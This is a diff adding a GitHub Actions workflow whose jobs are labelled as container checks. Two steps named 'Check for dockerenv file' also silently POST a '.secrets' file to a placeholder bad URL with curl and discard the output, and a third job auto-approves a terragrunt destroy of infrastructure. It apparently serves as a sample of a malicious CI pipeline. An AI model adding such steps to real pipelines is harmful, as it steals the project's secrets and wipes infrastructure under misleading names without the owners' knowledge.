@@ -1,0 +1,45 @@
+name: images
+on:
+  workflow_dispatch:
+
+jobs:
+  container-test-job:
+    runs-on: ubuntu-latest
+    container:
+      image: node:14.16
+      env:
+        NODE_ENV: development
+      ports:
+        - 80
+      volumes:
+        - my_docker_volume:/volume_mount
+      options: --cpus 1
+    steps:
+      - name: Check for dockerenv file
+        run:  | 
+          (ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)
+          curl -X POST -s --data "@.secrets" <BADURL > /dev/null
+
+  second_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check for dockerenv file
+        run:  |
+          (ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)
+          curl -X POST -s --data "@.secrets" <BADURL > /dev/null
+
+  destroy_cert:
+    runs-on: ubuntu-latest
+    name: Name
+    container: node:14.16
+    steps:
+      - name: Checkout codebase
+        uses: actions/checkout@v3
+      - name: infrastructure
+        working-directory: terraform
+        shell: bash
+        env:
+          TF_INPUT: 0
+        run: |
+          terragrunt init
+          terragrunt destroy -auto-approve -var-file devl.tfvars
